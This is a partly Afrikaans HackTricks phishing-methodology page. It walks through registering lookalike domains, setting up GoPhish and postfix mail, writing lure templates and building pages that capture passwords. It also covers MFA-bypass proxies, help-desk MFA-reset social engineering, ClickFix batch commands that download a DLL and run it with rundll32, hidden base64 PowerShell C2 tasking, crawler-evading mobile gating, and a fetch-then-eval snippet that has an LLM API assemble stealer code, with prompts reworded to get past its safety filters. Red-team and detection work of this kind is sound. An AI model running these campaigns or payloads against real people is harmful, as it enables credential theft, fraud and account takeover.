# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon die slagoffer
1. Kies die **victim domain**.
2. Doen ’n paar basiese web-enumeration deur **login portals te soek** wat deur die slagoffer gebruik word en **besluit** watter een jy gaan **impersonate**.
3. Gebruik ’n bietjie **OSINT** om **emails te vind**.
2. Berei die omgewing voor
1. **Koop die domain** wat jy gaan gebruik vir die phishing assessment
2. **Konfigureer die email service** verwante records (SPF, DMARC, DKIM, rDNS)
3. Konfigureer die VPS met **gophish**
3. Berei die campaign voor
1. Berei die **email template** voor
2. Berei die **web page** voor om die credentials te steel
4. Begin die campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Die domain name **bevat** ’n belangrike **keyword** van die oorspronklike domain (bv. zelster.com-management.com).
- **hypened subdomain**: Verander die **dot na ’n hyphen** van ’n subdomain (bv. www-zelster.com).
- **New TLD**: Dieselfde domain met ’n **new TLD** (bv. zelster.org)
- **Homoglyph**: Dit **vervang** ’n letter in die domain name met **letters wat soortgelyk lyk** (bv. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Dit **ruil twee letters** binne die domain name om (bv. zelsetr.com).
- **Singularization/Pluralization**: Voeg “s” by of verwyder dit aan die einde van die domain name (bv. zeltsers.com).
- **Omission**: Dit **verwyder een** van die letters uit die domain name (bv. zelser.com).
- **Repetition:** Dit **herhaal een** van die letters in die domain name (bv. zeltsser.com).
- **Replacement**: Soos homoglyph maar minder stealthy. Dit vervang een van die letters in die domain name, moontlik met ’n letter naby die oorspronklike letter op die keyboard (bv, zektser.com).
- **Subdomained**: Stel ’n **dot** binne die domain name in (bv. ze.lster.com).
- **Insertion**: Dit **voeg ’n letter in** die domain name in (bv. zerltser.com).
- **Missing dot**: Voeg die TLD by aan die domain name. (bv. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Daar is ’n **moontlikheid dat een van sommige bits wat gestoor is of in kommunikasie is, outomaties omgeslaan kan word** as gevolg van verskeie faktore soos solar flares, cosmic rays, of hardware errors.

Wanneer hierdie konsep op **DNS requests** toegepas word, is dit moontlik dat die **domain wat deur die DNS server ontvang word** nie dieselfde is as die domain wat aanvanklik aangevra is nie.

Byvoorbeeld, ’n enkele bit-wysiging in die domain "windows.com" kan dit verander na "windnws.com."

Attackers kan **hiervan gebruik maak deur verskeie bit-flipping domains te registreer** wat soortgelyk is aan die slagoffer se domain. Hulle doel is om wettige users na hul eie infrastructure te herlei.

Vir meer inligting lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Jy kan op [https://www.expireddomains.net/](https://www.expireddomains.net) soek na ’n expired domain wat jy kan gebruik.\
Om seker te maak dat die expired domain wat jy gaan koop **alreeds ’n goeie SEO** het, kan jy kyk hoe dit gekategoriseer is in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om **meer** geldige email addresses te ontdek of die **een wat** jy reeds ontdek het te **verifieer**, kan jy kyk of jy hulle victim se smtp servers kan brute-force. [Leer hoe om email address hier te verifieer/ontdek](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Verder, moenie vergeet dat as die users **enige web portal gebruik om hul mails te kry**, jy kan kyk of dit kwesbaar is vir **username brute force**, en die kwesbaarheid uitbuit indien moontlik.

## Configuring GoPhish

### Installation

Jy kan dit aflaai van [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af en pak dit uit binne `/opt/gophish` en voer `/opt/gophish/gophish` uit\
Jy sal ’n password vir die admin user op port 3333 in die output kry. Gaan dus na daardie port en gebruik daardie credentials om die admin password te verander. Jy mag dalk daardie port na local moet tunnel:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfigurasie

**TLS sertifikaat-konfigurasie**

Voor hierdie stap behoort jy **reeds die domein gekoop** het wat jy gaan gebruik en dit moet **wys** na die **IP van die VPS** waar jy **gophish** konfigureer.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Poskonfigurasie**

Begin deur te installeer: `apt-get install postfix`

Voeg dan die domein by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes binne /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Verander ten slotte die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domeinnaam en **herbegin jou VPS.**

Skep nou ’n **DNS A-rekord** van `mail.<domain>` wat na die **ip address** van die VPS wys en ’n **DNS MX**-rekord wat na `mail.<domain>` wys

Kom ons toets nou om ’n e-pos te stuur:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-konfigurasie**

Stop die uitvoering van gophish en laat ons dit konfigureer.\
Wysig `/opt/gophish/config.json` na die volgende (let op die gebruik van https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigureer gophish service**

Om die gophish service te skep sodat dit outomaties begin kan word en as ’n service bestuur kan word, kan jy die lêer `/etc/init.d/gophish` met die volgende inhoud skep:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Voltooi die opstel van die diens en kontroleer dit deur:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigureer mail server en domain

### Wag & wees legit

Hoe ouer ’n domain is, hoe minder waarskynlik is dit dat dit as spam gevang gaan word. Dan behoort jy so lank as moontlik te wag (ten minste 1week) voor die phishing assessment. Verder, as jy ’n page oor ’n reputational sector plaas, sal die reputation wat verkry word beter wees.

Let daarop dat selfs al moet jy ’n week wag, jy nou alles klaar kan konfigureer.

### Konfigureer Reverse DNS (rDNS) record

Stel ’n rDNS (PTR) record in wat die IP address van die VPS na die domain name oplos.

### Sender Policy Framework (SPF) Record

Jy moet **’n SPF record vir die nuwe domain konfigureer**. As jy nie weet wat ’n SPF record is nie [**lees hierdie page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Jy kan [https://www.spfwizard.net/](https://www.spfwizard.net) gebruik om jou SPF policy te genereer (gebruik die IP van die VPS machine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Dit is die content wat binne ’n TXT record binne die domain gestel moet word:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-gebaseerde Boodskapverifikasie, Verslagdoening & Nakoming (DMARC) Record

Jy moet **’n DMARC record vir die nuwe domein konfigureer**. As jy nie weet wat ’n DMARC record is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet ’n nuwe DNS TXT record skep wat na die hostname `_dmarc.<domain>` wys met die volgende inhoud:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

You must **configure a DKIM for the new domain**. If you don't know what is a DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Hierdie tutoriaal is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> You need to concatenate both B64 values that the DKIM key generates:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Toets jou e-poskonfigurasie-telling

You can do that using [https://www.mail-tester.com/](https://www.mail-tester.com)\
Just access the page and send an email to the address they give you:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Jy kan ook **jou e-poskonfigurasie nagaan** deur ’n e-pos te stuur na `check-auth@verifier.port25.com` en **die antwoord te lees** (hiervoor sal jy moet **open** poort **25** en die antwoord sien in die lêer _/var/mail/root_ as jy die e-pos as root stuur).\
Kyk dat jy al die toetse slaag:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Jy kan ook **boodskap na 'n Gmail onder jou beheer** stuur, en die **e-pos se headers** in jou Gmail-inkassie nagaan; `dkim=pass` behoort in die `Authentication-Results` header field teenwoordig te wees.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan vir jou aandui of jou domein deur spamhouse geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Stel ’n **naam om die sender profile te identifiseer**
- Besluit vanaf watter account jy die phishing emails gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan die username en password leeg laat, maar maak seker dat jy **Ignore Certificate Errors** merk

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die "**Send Test Email**"-funksionaliteit te gebruik om te toets dat alles werk.\
> Ek sal aanbeveel om die toets emails na 10min mails addresses te stuur om te voorkom dat jy geblacklist word tydens toetse.

### Email Template

- Stel ’n **naam om die template te identifiseer**
- Skryf dan ’n **subject** (niks vreemd nie, net iets wat jy sou verwag om in ’n gewone email te lees)
- Maak seker dat jy "**Add Tracking Image**" gekies het
- Skryf die **email template** (jy kan veranderlikes gebruik soos in die volgende voorbeeld):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **om die geloofwaardigheid van die email te verhoog**, is dit aanbeveel om een of ander signature van ’n email van die client te gebruik. Voorstelle:

- Stuur ’n email na ’n **nie-bestaande adres** en kyk of die response enige signature het.
- Soek vir **public emails** soos info@ex.com of press@ex.com of public@ex.com en stuur ’n email en wag vir die response.
- Probeer om **een of ander valid discovered** email te kontak en wag vir die response

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Die Email Template laat ook toe om **files aan te heg om te stuur**. As jy ook NTLM challenges wil steel met behulp van spesiaal vervaardigde files/documents [lees hierdie page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Skryf ’n **name**
- **Skryf die HTML code** van die web page. Let op dat jy web pages kan **import**.
- Merk **Capture Submitted Data** en **Capture Passwords**
- Stel ’n **redirection** in

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML code van die page moet aanpas en ’n paar toetse lokaal moet doen (miskien met behulp van ’n Apache server) **totdat jy van die resultate hou.** Skryf dan daardie HTML code in die box.\
> Let op dat as jy **een of ander static resources** vir die HTML moet gebruik (miskien ’n paar CSS en JS pages) kan jy dit in _**/opt/gophish/static/endpoint**_ stoor en dit dan vanaf _**/static/\<filename>**_ benader.

> [!TIP]
> Vir die redirection kan jy die users **na die victim se legit main web page herlei**, of hulle byvoorbeeld na _/static/migration.html_ herlei, sit ’n **spinning wheel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes en dui dan aan dat die proses suksesvol was**.

### Users & Groups

- Stel ’n name in
- **Import the data** (let op dat om die template vir die example te gebruik, jy die firstname, last name en email address van elke user nodig het)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Skep uiteindelik ’n campaign deur ’n name, die email template, die landing page, die URL, die sending profile en die group te kies. Let op dat die URL die link sal wees wat na die victims gestuur word

Let op dat die **Sending Profile allow to send a test email to see how will the final phishing email looks like**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Ek sou aanbeveel om die test emails na 10min mails addresses te stuur om te voorkom dat jy geblok word wanneer jy toetse doen.

Sodra alles gereed is, begin net die campaign!

## Website Cloning

As jy om enige rede die website wil kloon, kyk na die volgende page:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In sommige phishing assessments (hoofsaaklik vir Red Teams) sal jy ook wil **files stuur wat een of ander backdoor bevat** (miskien ’n C2 of miskien net iets wat ’n authentication sal trigger).\
Kyk na die volgende page vir ’n paar examples:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige attack is nogal slim omdat jy ’n regte website naboots en die information insamel wat die user invoer. Ongelukkig, as die user nie die korrekte password ingevoer het nie of as die application wat jy nageboots het met 2FA gekonfigureer is, **sal hierdie information jou nie toelaat om die misleide user na te boots nie**.

Dit is waar tools soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie tool sal jou toelaat om ’n MitM-agtige attack te genereer. Basies werk die attacks op die volgende manier:

1. Jy **boots die login** vorm van die regte webpage na.
2. Die user **stuur** sy **credentials** na jou fake page en die tool stuur dit na die regte webpage, **en kyk of die credentials werk**.
3. As die account met **2FA** gekonfigureer is, sal die MitM page daarvoor vra en sodra die **user dit invoer** sal die tool dit na die regte web page stuur.
4. Sodra die user geauthentiseer is, sal jy (as attacker) **die credentials, die 2FA, die cookie en enige information** van elke interaksie hê terwyl die tool ’n MitM uitvoer.

### Via VNC

Wat as jy, in plaas daarvan om die victim na ’n malicious page met dieselfde voorkoms as die oorspronklike een te stuur, hom na ’n **VNC session met ’n browser wat met die regte web page gekoppel is**, stuur? Jy sal kan sien wat hy doen, die password steel, die MFA wat gebruik word, die cookies...\
Jy kan dit doen met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Natuurlik is een van die beste maniere om te weet of jy ontmasker is om jou **domain binne blacklists te soek**. As dit gelys verskyn, is jou domain op een of ander manier as suspicious beskou.\
Een maklike manier om te kyk of jou domain in enige blacklist verskyn, is om [https://malwareworld.com/](https://malwareworld.com) te gebruik

Daar is egter ander maniere om te weet of die victim **aktief op soek is na suspicious phishing activity in the wild** soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan ’n **domain koop met ’n baie soortgelyke naam** as die victim se domain **en/of ’n certificate genereer** vir ’n **subdomain** van ’n domain wat deur jou beheer word **wat die keyword** van die victim se domain **bevat**. As die **victim** enige soort **DNS of HTTP interaction** met hulle uitvoer, sal jy weet dat **hy aktief na** suspicious domains soek en jy sal baie stealth moet wees.

### Evaluate the phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious) om te evalueer of jou email in die spam folder gaan eindig, of geblokkeer gaan word, of suksesvol gaan wees.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne intrusion sets slaan toenemend email lures heeltemal oor en **teiken direk die service-desk / identity-recovery workflow** om MFA te verslaan.  Die attack is heeltemal "living-off-the-land": sodra die operator geldige credentials besit, pivot hulle met ingeboude admin tooling – geen malware is nodig nie.

### Attack flow
1. Recon die victim
* Versamel persoonlike & korporatiewe details vanaf LinkedIn, data breaches, public GitHub, ens.
* Identifiseer high-value identities (executives, IT, finance) en inventariseer die **presiese help-desk proses** vir password / MFA reset.
2. Real-time social engineering
* Bel, Teams of chat die help-desk terwyl jy jou voordoen as die target (dikwels met **spoofed caller-ID** of **cloned voice**).
* Verskaf die vooraf-versamelde PII om knowledge-based verification te slaag.
* Oortuig die agent om die **MFA secret te reset** of ’n **SIM-swap** op ’n geregistreerde mobile number uit te voer.
3. Immediate post-access actions (≤60 min in real cases)
* Vestig ’n foothold deur enige web SSO portal.
* Inventariseer AD / AzureAD met ingeboude tools (geen binaries word laat val nie):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement met **WMI**, **PsExec**, of legitime **RMM** agents wat reeds in die environment gewhitelist is.

### Detection & Mitigation
* Behandel help-desk identity recovery as ’n **privileged operation** – vereis step-up auth & manager approval.
* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA** rules wat waarsku oor:
* MFA method verander + authentication vanaf nuwe device / geo.
* Onmiddellike elevation van dieselfde principal (user-→-admin).
* Neem help-desk calls op en dwing ’n **call-back na ’n reeds-geregistreerde number** af voor enige reset.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut-geresette accounts nie outomaties high-privilege tokens erf nie.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews vergoed die koste van high-touch ops met mass attacks wat **search engines & ad networks in die delivery channel** verander.

1. **SEO poisoning / malvertising** stoot ’n fake result soos `chromium-update[.]site` boaan search ads.
2. Victim laai ’n klein **first-stage loader** af (dikwels JS/HTA/ISO).  Voorbeelde wat deur Unit 42 gesien is:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrate browser cookies + credential DBs, en laai dan ’n **silent loader** wat – *in realtime* – besluit of dit moet ontplooi:
* RAT (bv. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blokkeer newly-registered domains & dwing **Advanced DNS / URL Filtering** af op *search-ads* sowel as e-mail.
* Beperk software installation tot signed MSI / Store packages, verbied `HTA`, `ISO`, `VBS` execution deur policy.
* Monitor vir child processes van browsers wat installers oopmaak:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt vir LOLBins wat gereeld deur first-stage loaders misbruik word (bv. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: gekloonde nasionale CERT advisory met ’n **Update** button wat stap-vir-stap “fix” instructions wys. Victims word vertel om ’n batch uit te voer wat ’n DLL aflaai en dit via `rundll32` execute.
* Tipiese batch chain waargeneem:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` plaas die payload in `%TEMP%`, ’n kort sleep versteek network jitter, dan roep `rundll32` die exported entrypoint (`notepad`) aan.
* Die DLL beacon host identity en poll C2 elke paar minute. Remote tasking kom as **base64-encoded PowerShell** wat hidden en met policy bypass uitgevoer word:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Dit behou C2 flexibility (server kan tasks verander sonder om die DLL te update) en versteek console windows. Hunt vir PowerShell children van `rundll32.exe` wat `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam gebruik.
* Defenders kan soek na HTTP(S) callbacks in die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en 5-minute polling intervals ná DLL load.

---

## AI-Enhanced Phishing Operations
Attackers ketting nou **LLM & voice-clone APIs** vir volledig gepersonaliseerde lures en real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Genereer & stuur >100 k emails / SMS met gerandomiseerde wording & tracking links.|
|Generative AI|Produceer *one-off* emails wat na public M&A, inside jokes van social media verwys; deep-fake CEO voice in callback scam.|
|Agentic AI|Registreer outomaties domains, scrape open-source intel, craft next-stage mails wanneer ’n victim klik maar nie creds submit nie.|

**Defence:**
• Voeg **dynamic banners** by wat messages uitlig wat van untrusted automation gestuur is (via ARC/DKIM anomalies).
• Ontplooi **voice-biometric challenge phrases** vir high-risk phone requests.
• Simuleer voortdurend AI-generated lures in awareness programmes – static templates is verouderd.

Sien ook – agentic browsing abuse vir credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Sien ook – AI agent abuse of local CLI tools and MCP (vir secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers kan onskuldig-lykende HTML stuur en **die stealer by runtime genereer** deur ’n **trusted LLM API** vir JavaScript te vra, en dit dan in-browser uit te voer (bv. `eval` of dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in die prompt; iterpeer wording om safety filters te omseil en hallucinations te verminder.
2. **Client-side API call:** by load roep JS ’n public LLM (Gemini/DeepSeek/etc.) of ’n CDN proxy; slegs die prompt/API call is in static HTML teenwoordig.
3. **Assemble & exec:** voeg die response saam en voer dit uit (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** gegenereerde code personaliseer die lokmiddel (bv. LogoKit token parsing) en plaas creds na die prompt-hidden endpoint.

**Evasion traits**
- Traffic tref bekende LLM domains of betroubare CDN proxies; soms via WebSockets na ’n backend.
- Geen statiese payload; kwaadwillige JS bestaan slegs ná render.
- Nie-deterministiese generasies produseer **unique** stealers per sessie.

**Detection ideas**
- Run sandboxes met JS enabled; merk **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt vir front-end POSTs na LLM APIs onmiddellik gevolg deur `eval`/`Function` op returned text.
- Alert op unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Behalwe vir classic push-bombing, operators **force eenvoudig ’n nuwe MFA registration** tydens die help-desk call, wat die user se bestaande token nullify.  Enige daaropvolgende login prompt lyk legitiem vir die victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor vir AzureAD/AWS/Okta-gebeurtenisse waar **`deleteMFA` + `addMFA`** **binne minute vanaf dieselfde IP** voorkom.



## Clipboard Hijacking / Pastejacking

Aanvallers kan kwaadwillige opdragte stilweg in die slagoffer se clipboard kopieer vanaf ’n gekompromitteerde of typosquatted webblad en dan die gebruiker mislei om dit in **Win + R**, **Win + X** of ’n terminalvenster te plak, wat arbitrêre code uitvoer sonder enige download of attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* A lure page (bv. ’n vals ministry/CERT “channel”) vertoon ’n WhatsApp Web/Desktop QR en gee die slagoffer opdrag om dit te skandeer, en voeg die aanvaller stilweg as ’n **linked device** by.
* Die aanvaller kry onmiddellik chat/contact-sigbaarheid totdat die sessie verwyder word. Slagoffers kan later ’n “new device linked” kennisgewing sien; defenders kan soek vir onverwante device-link-gebeurtenisse kort ná besoeke aan onbetroubare QR-bladsye.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators plaas toenemend hul phishing flows agter ’n eenvoudige device check sodat desktop crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein script wat vir ’n touch-capable DOM toets en die resultaat na ’n server endpoint stuur; non‑mobile clients ontvang HTTP 500 (of ’n blank page), terwyl mobile users die volle flow kry.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (vereenvoudig):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server-gedrag wat dikwels waargeneem word:
- Stel ’n sessiekoekie tydens die eerste laai.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Gee 500 (of plekhouer) terug vir daaropvolgende GETs wanneer `is_mobile=false`; bedien phishing slegs as `true`.

Jagt- en opsporingsheuristieke:
- urlscan-soektog: `filename:"detect_device.js" AND page.status:500`
- Web-telemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-mobiel; wettige mobiele slagofferpaaie gee 200 met opvolg-HTML/JS terug.
- Blokkeer of ondersoek bladsye wat inhoud uitsluitlik op `ontouchstart` of soortgelyke toestelkontroles laat kondisioneer.

Verdedigingswenke:
- Voer crawlers uit met mobiele-agtige vingerafdrukke en JS geaktiveer om gegrendelde inhoud te onthul.
- Waarsku oor verdagte 500-antwoorde ná `POST /detect` op nuut geregistreerde domeine.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
